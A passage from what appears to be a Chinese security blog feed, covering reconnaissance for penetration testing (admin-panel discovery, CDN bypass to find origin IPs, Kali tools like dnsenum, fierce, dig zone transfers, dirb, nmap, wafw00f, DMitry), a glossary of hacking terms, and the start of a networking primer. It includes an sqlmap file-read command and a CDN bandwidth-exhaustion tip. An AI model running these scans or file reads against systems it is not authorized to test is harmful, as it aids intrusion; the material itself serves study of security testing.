title="后台查找总结"></a>后台查找总结</h1><ul><li><p>弱口令默认后台：admin，admin&#x2F;login.asp，manage，login.asp等等常见后台</p></li><li><p>查看网页的链接：一般来说，网站的主页有管理登陆类似的东西，有些可能被管理员删掉</p></li><li><p>查看网站图片的属性</p></li><li><p>查看网站使用的管理系统，从而确定后台</p></li><li><p>用工具查找：wwwscan，intellitamper，御剑</p></li><li><p>robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</p></li><li><p>GoogleHacker</p></li><li><p>查看网站使用的编辑器是否有默认后台</p></li><li><p>短文件利用</p></li><li><p>sqlmap –sql-shell  load_file(‘d:&#x2F;wwroot&#x2F;index.php’);</p><h1 id="CDN绕过总结"><a href="#CDN绕过总结" class="headerlink" title="CDN绕过总结"></a>CDN绕过总结</h1><p>CDN的全称是Content Delivery Network,即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><h2 id="如何判断网站有没有使用CDN"><a href="#如何判断网站有没有使用CDN" class="headerlink" title="如何判断网站有没有使用CDN"></a>如何判断网站有没有使用CDN</h2><blockquote><blockquote><p>看响应时间工具：<a href="http://tool.chinaz.com/speedtest">http://tool.chinaz.com/speedtest</a><br>ping ip或域名，看是否会出现变化无<br>nslookup 域名，看是否会有很多节点</p></blockquote></blockquote><h2 id="CDN对测试有何影响-amp-如何绕过"><a href="#CDN对测试有何影响-amp-如何绕过" class="headerlink" title="CDN对测试有何影响&amp;如何绕过"></a>CDN对测试有何影响&amp;如何绕过</h2></li><li><p>子域名查询：有的网站主域名会做CDN，但是子域名可能不会做</p></li><li><p>邮件服务查询：我们访问别人，可能通过CND，但别人访问我们通常不会走CDN</p></li><li><p>国外地址请求：国外没有cdn节点的话，可能直接走原ip</p></li><li><p>遗留文件，扫描全网</p></li><li><p>黑暗引擎搜索特定文件</p></li><li><p>dns历史记录，以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</p><h2 id="子域名上面的小技巧"><a href="#子域名上面的小技巧" class="headerlink" title="子域名上面的小技巧"></a>子域名上面的小技巧</h2></li><li><p>二级域名和三级域名查到的结果可能不一样</p></li><li><p>主域名和子域名查询到的可能不一样</p></li><li><p>DNs历史记录&#x3D;第三方接口(接口查询)</p></li><li><p>采集&#x2F;国外请求( 同类型访问)</p></li><li><p>邮件源码测试对比第三方查询(地区分析)</p></li><li><p>黑暗引擎(shodan搜指定hash文件)</p></li><li><p>扫全网 fuckcdn，w8 fuckcdn，zmap等工具扫描</p></li><li><p>认为判定，根据网站的域名备案推测</p></li><li><p>本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</p></li></ul><h1 id="KALI-信息收集工具使用"><a href="#KALI-信息收集工具使用" class="headerlink" title="KALI 信息收集工具使用"></a>KALI 信息收集工具使用</h1><h2 id="Robots文件探测"><a href="#Robots文件探测" class="headerlink" title="Robots文件探测"></a>Robots文件探测</h2><ul><li>获取网站隐藏敏感目录活文件</li><li>比如：安装目录，上传目录，编辑器目录，管理目录，管理页面等<h2 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h2></li><li>搜集网站域名信息，如子域名，其他域名，解析服务器，区域传送漏洞等</li><li>常用工具：dnsenum、dig、fierce</li></ul><hr><h2 id="dnsenum-可以通过字典或者谷歌猜测可能存在的域名，并对一个网段进行反查。"><a href="#dnsenum-可以通过字典或者谷歌猜测可能存在的域名，并对一个网段进行反查。" class="headerlink" title="dnsenum 可以通过字典或者谷歌猜测可能存在的域名，并对一个网段进行反查。"></a>dnsenum 可以通过字典或者谷歌猜测可能存在的域名，并对一个网段进行反查。</h2><ul><li>获取其他域名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --enum xxxxxx.com  </span><br><span class="line">-r 允许用户设置递归查询</span><br><span class="line">-w允许用户设置whois请求。</span><br><span class="line">-o 允许用户指定输入文件位置</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="fierce-工具主要是对子域名进行扫描和收集信息的。使用fierce工具获取一个目标主机上所有ip地址和主机信息。还可以测试区域传送漏洞。"><a href="#fierce-工具主要是对子域名进行扫描和收集信息的。使用fierce工具获取一个目标主机上所有ip地址和主机信息。还可以测试区域传送漏洞。" class="headerlink" title="fierce 工具主要是对子域名进行扫描和收集信息的。使用fierce工具获取一个目标主机上所有ip地址和主机信息。还可以测试区域传送漏洞。"></a>fierce 工具主要是对子域名进行扫描和收集信息的。使用fierce工具获取一个目标主机上所有ip地址和主机信息。还可以测试区域传送漏洞。</h2><ul><li>获取其他域名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fierce -dns baidu.com </span><br><span class="line">--wordlist 指定字典</span><br><span class="line">fierce -dns ns9.baidu.com  --wordlist host.txt /tmp/12.txt</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="dig工具也是一款比较流行的dns侦查工具"><a href="#dig工具也是一款比较流行的dns侦查工具" class="headerlink" title="dig工具也是一款比较流行的dns侦查工具"></a>dig工具也是一款比较流行的dns侦查工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig www.xxxxxxxx.com  查询dns</span><br><span class="line">dig -t ns xxxxxxxx.com  找解析域名的授权dns</span><br><span class="line">dig axfr @ns1.dns.net xxxxxxxx.com </span><br></pre></td></tr></table></figure><h2 id="敏感目录探测"><a href="#敏感目录探测" class="headerlink" title="敏感目录探测"></a>敏感目录探测</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>暴力破解的方法就是需要一个强大的目录名称字典，用来尝试逐个匹配，如果存在通过响应吗的回显来确定目录或者页面是否存在</p><h3 id="目录爬行"><a href="#目录爬行" class="headerlink" title="目录爬行"></a>目录爬行</h3><h2 id="目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行"><a href="#目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行" class="headerlink" title="目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行"></a>目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行</h2><h4 id="目录暴力破解工具"><a href="#目录暴力破解工具" class="headerlink" title="目录暴力破解工具"></a>目录暴力破解工具</h4><p>dirb 工具是一款非常好用的目录暴力猜解工具，自带强大字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://www.xxxx.com</span><br><span class="line">dirb https://www.xxxx.com</span><br><span class="line">dirb http://www.xxxx.com /usr/wordlist.txt</span><br></pre></td></tr></table></figure><hr><h4 id="dirbuster工具是一款非常好用的目录暴力猜解工具，自带强大字典"><a href="#dirbuster工具是一款非常好用的目录暴力猜解工具，自带强大字典" class="headerlink" title="dirbuster工具是一款非常好用的目录暴力猜解工具，自带强大字典"></a>dirbuster工具是一款非常好用的目录暴力猜解工具，自带强大字典</h4><hr><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>扫描整个子网,命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure><p>扫描多个目标,命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap 192.168.1.2 192.168.1.5</span><br></pre></td></tr></table></figure><p>扫描一个范围内的目标,如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</span><br></pre></td></tr></table></figure><p>你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap -iL target.txt</span><br></pre></td></tr></table></figure><p>你想看到你扫描的所有主机的列表，用以下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap -sL 192.168.1.1/24</span><br></pre></td></tr></table></figure><p>扫描除过某一个ip外的所有子网主机,命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#nmap192.168.1.1/24-exclude192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="整站识别"><a href="#整站识别" class="headerlink" title="整站识别"></a>整站识别</h2><ul><li>whatweb</li><li>用来识别网站cms 及搭建平台环境的工具<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://www.xxxx.com</span><br></pre></td></tr></table></figure></li><li>平台、脚本、cms、容器、数据库等信息探测<h2 id="Waf探测"><a href="#Waf探测" class="headerlink" title="Waf探测"></a>Waf探测</h2></li><li>wafw00f </li><li>用来识别网站waf的一款工具<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f  http://www.xxxx.com</span><br></pre></td></tr></table></figure><h2 id="工具型站的使用"><a href="#工具型站的使用" class="headerlink" title="工具型站的使用"></a>工具型站的使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchdns.netcraft.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chinaz.com/ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aizhan.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan.io</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Google hacker</span><br></pre></td></tr></table></figure><h1 id="综合扫描工具–DMitry"><a href="#综合扫描工具–DMitry" class="headerlink" title="综合扫描工具–DMitry"></a>综合扫描工具–DMitry</h1>DMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息：</li></ul><ol><li>端口扫描</li><li>whois主机IP和域名信息</li><li>从Netcraft.com获取主机信息</li><li>子域名</li><li>域名中包含的邮件地址<br>尽管这些信息可以在Kali中通过多种工具获取，但是使用DMitry可以将收集的信息保存在一个文件中，方便查看。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry  -wnpb xxxx.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -winse  xxxx.com   扫描网站注册信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry  -p xxxx.com  -f -b 查看主机开放端口</span><br></pre></td></tr></table></figure><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/202207191557632.jpeg"></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试专业术语</title>
      <link href="/archives/fafc01e0.html"/>
      <url>/archives/fafc01e0.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试专业术语介绍"><a href="#渗透测试专业术语介绍" class="headerlink" title="渗透测试专业术语介绍"></a>渗透测试专业术语介绍</h1><h3 id="域名"><a href="#域名" class="headerlink" title="域名:"></a>域名:</h3><ul><li>由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）.<h4 id="二级域名："><a href="#二级域名：" class="headerlink" title="二级域名："></a>二级域名：</h4></li><li>二级域名：在国际顶级域名下的二级域名</li><li>国家顶级域名下二级域名.</li></ul><p>域名发现对于安全测试可以给安全测试提供更多的测试点，方便获取更多相关信息</p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS:"></a>DNS:</h3><ul><li>域名系统（Domain Name System）。它是一个域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。<h4 id="本地-HOSTS-与-DNS-的关系"><a href="#本地-HOSTS-与-DNS-的关系" class="headerlink" title="本地 HOSTS 与 DNS 的关系:"></a>本地 HOSTS 与 DNS 的关系:</h4></li><li>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<h4 id="常见的-DNS-安全攻击"><a href="#常见的-DNS-安全攻击" class="headerlink" title="常见的 DNS 安全攻击"></a>常见的 DNS 安全攻击</h4></li></ul><ul><li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li><li>DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广）</li><li>域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点）</li><li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li><li>cc攻击: 攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(Challenge Collapsar)。<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3></li></ul><ul><li>CDN 利用全局负载均衡技术将用户的访问指向离用户最近的工作正常的流媒体服务器上，由流媒体服务器直接响应用户的请求。服务器中如果没有用户要访问的内容，会根据配置自动从原服务器抓取相应的内容并提供给用户。 <h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp php aspx jsp javaweb pl py cgi 等</span><br></pre></td></tr></table></figure><h4 id="不同脚本类型与安全漏洞的关系"><a href="#不同脚本类型与安全漏洞的关系" class="headerlink" title="不同脚本类型与安全漏洞的关系"></a>不同脚本类型与安全漏洞的关系</h4></li></ul><ul><li>不同脚本可能爆发漏洞的可能性有所不同</li><li>不同脚本漏洞的存在点可能不同，因为不同语言的适用范围不同</li></ul><h3 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</span><br></pre></td></tr></table></figure><h3 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h3><ul><li>硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3></li></ul><ul><li>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。</li><li>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。<h4 id="后门在安全测试中的实际意义"><a href="#后门在安全测试中的实际意义" class="headerlink" title="后门在安全测试中的实际意义"></a>后门在安全测试中的实际意义</h4></li><li>可以更方便的链接到主机</li><li>在获取到玩主机权限的时候，后门可以充当命令控制台的角色<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-的组成架构模型"><a href="#WEB-的组成架构模型" class="headerlink" title="WEB 的组成架构模型"></a>WEB 的组成架构模型</h4></li></ul><ul><li>网站源码：分脚本类型，分应用方向</li><li>操作系统：windows linux</li><li>中间件（搭建平台）：apache iis tomcat nginx 等</li><li>数据库：access mysql mssql oracle sybase db2 postsql 等<h4 id="从-WEB-层面为主"><a href="#从-WEB-层面为主" class="headerlink" title="从 WEB 层面为主"></a>从 WEB 层面为主</h4></li><li>web使用的比较广</li><li>web网站了漏洞相对较多</li><li>web 作为跳板深入到其他资源相对容易<h4 id="WEB-相关安全漏洞"><a href="#WEB-相关安全漏洞" class="headerlink" title="WEB 相关安全漏洞"></a>WEB 相关安全漏洞</h4></li><li>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li><li>WEB 中间件对应漏洞：未授权访问，变量覆盖…</li><li>WEB 数据库对应漏洞：弱口令，权限提升…</li><li>WEB 系统层对应漏洞：提权，远程代码执行</li><li>其他第三方对应漏洞</li><li>APP 或 PC 应用结合类<h3 id="vps"><a href="#vps" class="headerlink" title="vps"></a>vps</h3></li><li>虚拟专用服务器（Virtual Private Server，简称VPS）技术，是将一台服务器分割成多个虚拟专享服务器的优质服务。<h3 id="HTTP-x2F-HTTPS-："><a href="#HTTP-x2F-HTTPS-：" class="headerlink" title="HTTP&#x2F;HTTPS ："></a>HTTP&#x2F;HTTPS ：</h3></li></ul><ul><li>HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</li><li>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</li><li>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li><li>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。<h3 id="CMS："><a href="#CMS：" class="headerlink" title="CMS："></a>CMS：</h3></li><li>内容管理系统（已经写好的管理系统 稍微修改一下就可以直接使用）</li><li>C&#x2F;S结构（Client&#x2F;Server，客户&#x2F;服务器模式）</li><li>B&#x2F;S结构（Browser&#x2F;Server，浏览器&#x2F;服务器模式）<h4 id="框架："><a href="#框架：" class="headerlink" title="框架："></a>框架：</h4></li></ul><ul><li>代码框架 比如cms是已经装修好的房子 框架就是毛坯房<h3 id="肉鸡："><a href="#肉鸡：" class="headerlink" title="肉鸡："></a>肉鸡：</h3></li><li>被黑客入侵并被长期驻扎的计算机或服务器<h3 id="抓鸡："><a href="#抓鸡：" class="headerlink" title="抓鸡："></a>抓鸡：</h3></li><li>即设法控制电脑，将其沦为肉鸡。<h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡:"></a>肉鸡:</h3></li><li>利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为.<h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板:"></a>跳板:</h3></li><li>一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。<h3 id="一句话木马："><a href="#一句话木马：" class="headerlink" title="一句话木马："></a>一句话木马：</h3></li><li>通过向服务端提交一句简短的代码，配合本地客户端实现webshell功能的木马<h4 id="大马"><a href="#大马" class="headerlink" title="大马:"></a>大马:</h4></li><li>功能强大的网页后门，能执行命令，操作文件，连接数据库。<h4 id="小马"><a href="#小马" class="headerlink" title="小马:"></a>小马:</h4></li><li>比较单一的网页后门。一般是上传保存大马。<h3 id="WebShell："><a href="#WebShell：" class="headerlink" title="WebShell："></a>WebShell：</h3></li><li>通过Web入侵后留下的后门工具，可以据此对网站服务进行一定程度的控制<h3 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h3></li><li>操作系统低权限的账户将自己提升为管理员权限使用的方法<h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit:"></a>rootkit:</h3></li><li>Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。<h3 id="源码打包："><a href="#源码打包：" class="headerlink" title="源码打包："></a>源码打包：</h3></li><li>把网站源码打包下载<h3 id="拖库："><a href="#拖库：" class="headerlink" title="拖库："></a>拖库：</h3></li><li>拖库本来是数据库领域的术语，指从数据库中导出数据。黑客入侵数据库后把数据库导出来。<h3 id="暴库："><a href="#暴库：" class="headerlink" title="暴库："></a>暴库：</h3></li><li>就是通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。<h3 id="撞库："><a href="#撞库：" class="headerlink" title="撞库："></a>撞库：</h3></li><li>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表,尝试批量登陆其他网站后，得到一系列可以登录的用户。很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试。登录B网址，这就可以理解为撞库攻击。<h3 id="嗅探："><a href="#嗅探：" class="headerlink" title="嗅探："></a>嗅探：</h3></li><li>就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。<h3 id="社会工程学攻击"><a href="#社会工程学攻击" class="headerlink" title="社会工程学攻击"></a>社会工程学攻击</h3></li><li>社会工程学攻击是一种通过对被攻击者心理弱点、本能反应、好奇心。信任、贪婪等心理陷阱所采取的诸如欺骗、伤害等危害手段，获取自身利益的手法。黑客社会工程学攻击则是将黑客入侵攻击手段进行了最大化,不仅能够利用系统的弱点进行入侵,还能通过人性的弱点进行入侵，当黑客攻击与社会工程学攻击融为一体时，将根本不存在所谓的安全的系统。<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3></li><li>漏洞利用 一般都是demo工具 （可能会进行破坏…………poc则是证明存在但不利用）<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3></li><li>攻击载荷，被送到目标机器执行的整段代码<h3 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h3></li><li>全称”Proof of Concept中文译作概念验证。可以理解成为漏洞验证程序。通常是指一段漏洞证明的代码，验证漏洞是否有效，PoC通常是无害的，仅为验证漏洞是否存在。<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE:"></a>CVE:</h3></li><li>CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”通用漏洞披露。CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。<h3 id="BUG："><a href="#BUG：" class="headerlink" title="BUG："></a>BUG：</h3></li><li>指系统功能与预期不一致的代码缺陷<h3 id="SRC"><a href="#SRC" class="headerlink" title="SRC:"></a>SRC:</h3></li><li>安全应急响应中心(Security Emergency Response Center)主要针对科技互联网企业常见的安全漏洞而特别设立的机构。<h3 id="通用型漏洞："><a href="#通用型漏洞：" class="headerlink" title="通用型漏洞："></a>通用型漏洞：</h3></li><li>通用型漏洞是指一类软件或设备具有的漏洞<br>如Python、Discuz、Springboot等开源软件本身的漏洞，使用这些开源软件的软件 可能都具有这些漏洞。</li><li>示例：<br> 如Python、Springboot存在漏洞，那么只要使用了Python、Springboot的软件都可能存在这些漏洞.<br> win10系统存在漏洞，那么只要装了win10系统的设备都存在漏洞.<h3 id="事件型漏洞："><a href="#事件型漏洞：" class="headerlink" title="事件型漏洞："></a>事件型漏洞：</h3></li><li>事件型漏洞是指某一个具体网站或应用的漏洞，需要主动针对网站或应用进行渗透测试，注意：此行为违法</li><li>示例：<br> 某手机官方论坛800多万用户信息泄露.<br> 某旅游网站用户信用卡信息泄露均属于该漏洞类型.<h3 id="后门："><a href="#后门：" class="headerlink" title="后门："></a>后门：</h3></li><li>黑客为了对主机进行长期的控制，在机器上终止的一段程序或留下的一个“入口”<h3 id="跳板："><a href="#跳板：" class="headerlink" title="跳板："></a>跳板：</h3></li><li>使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息<h3 id="旁站入侵："><a href="#旁站入侵：" class="headerlink" title="旁站入侵："></a>旁站入侵：</h3></li><li>即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、和web在线查询等<h3 id="C段入侵："><a href="#C段入侵：" class="headerlink" title="C段入侵："></a>C段入侵：</h3></li><li>同网段不同服务器的渗透方案，可能某公司在外网C段中拥有多个IP地址，但是内网却相连着，主目标不存在漏洞通过C段中其他存在漏洞的机器进入内网。<h3 id="渗透测试："><a href="#渗透测试：" class="headerlink" title="渗透测试："></a>渗透测试：</h3></li><li>黑盒测试、白盒测试<h3 id="0day："><a href="#0day：" class="headerlink" title="0day："></a>0day：</h3></li><li>未公开的漏洞 仅少数人知道<h3 id="1day："><a href="#1day：" class="headerlink" title="1day："></a>1day：</h3></li><li>刚公开的漏洞官方发布了补丁，但是网上还有很多未打补丁的漏洞<h3 id="nday："><a href="#nday：" class="headerlink" title="nday："></a>nday：</h3></li><li>漏洞发布了很久还是没有修复的漏洞<h3 id="APT攻击："><a href="#APT攻击：" class="headerlink" title="APT攻击："></a>APT攻击：</h3></li><li>Advanced Persistent Threat，高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的供给形式（极强的隐蔽性、潜伏期长，持续性强、目标性强）<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3></li><li>指那些强度不够，容易被猜解的，类似 123，abc 这样的口令（密码）。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 术语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础知识</title>
      <link href="/archives/2fa9840e.html"/>
      <url>/archives/2fa9840e.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络基础知识"><a href="#网络基础知识" class="headerlink" title="网络基础知识"></a>网络基础知识</h1><h1 id="网络层次划分"><a href="#网络层次划分" class="headerlink" title="网络层次划分"></a>网络层次划分</h1><img src="/img/11111.png"><img src="/img/5e57f5e6213448d8428cbba2328a85f.jpg"><img src="/img/1538030296-8668-20150904095142060-1017190812.gif"><h2 id="OSI分层"><a href="#OSI分层" class="headerlink" title="OSI分层"></a>OSI分层</h2><p>OSI RM：开放系统互连参考模型（Open System Interconnection Reference Model）<br>OSI参考模型具有以下优点:</p><ul><li>简化了相关的网络操作</li><li>提供设备间的兼容性和标准接口</li><li>促进标准化工作</li><li>结构上可以分隔</li><li>易于实现和维护</li></ul><table><thead><tr><th>.</th><th>.</th></tr></thead><tbody><tr><td>7</td><td>应用层</td></tr><tr><td>6</td><td>表示层</td></tr><tr><td>5</td><td>会话层</td></tr><tr><td>4</td><td>传输层</td></tr><tr><td>3</td><td>网络层</td></tr><tr><td>2</td><td>数据链路层</td></tr><tr><td>1</td><td>物理层</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">高层: 5.6.7 负责主机之间的数据传输</span><br><span class="line">底层: 1.2.3 负责网络数据传输</span><br></pre></td></tr></table></figure><h2 id="OSI七层功能"><a href="#OSI七层功能" class="headerlink" title="OSI七层功能"></a>OSI七层功能</h2><table><thead><tr><th>.</th><th>.</th><th>.</th></tr></thead><tbody><tr><td>7</td><td>应用层</td><td>提供应用程序间通信</td></tr><tr><td>6</td><td>表示层</td><td>处理数据格式、数据加密等</td></tr><tr><td>5</td><td>会话层</td><td>建立、维护和管理会话</td></tr><tr><td>4</td><td>传输层</td><td>建立主机端到端连接</td></tr><tr><td>3</td><td>网络层</td><td>寻址和路由选择</td></tr><tr><td>2</td><td>数据链路层</td><td>提供介质访问、链路管理等</td></tr><tr><td>1</td><td>物理层</td><td>比特流传输</td></tr></tbody></table><h2 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h2><ul><li>除了标准的OSI七层模型以外，常见的网络层次划分还有TCP&#x2F;IP四层协议以及TCP&#x2F;IP五层协议</li></ul><table><thead><tr><th>.</th><th>.</th><th>.</th><th>.</th></tr></thead><tbody><tr><td>5</td><td>应用层</td><td>HTTP、Telnet、FTP、TFTP</td><td>提供应用程序网络接口</td></tr><tr><td>4</td><td>传输层</td><td>TCP&#x2F;UDP</td><td>提供应用程序网络接口</td></tr><tr><td>3</td><td>网络层</td><td>IP</td><td>寻址和路由选择</td></tr><tr><td>2</td><td>数据链路层</td><td>Ethernet、802.3、PPP</td><td>物理介质访问</td></tr><tr><td>1</td><td>物理层</td><td>接口和线缆</td><td>二进制数据流传输</td></tr></tbody></table><h2 id="Ip地址"><a href="#Ip地址" class="headerlink" 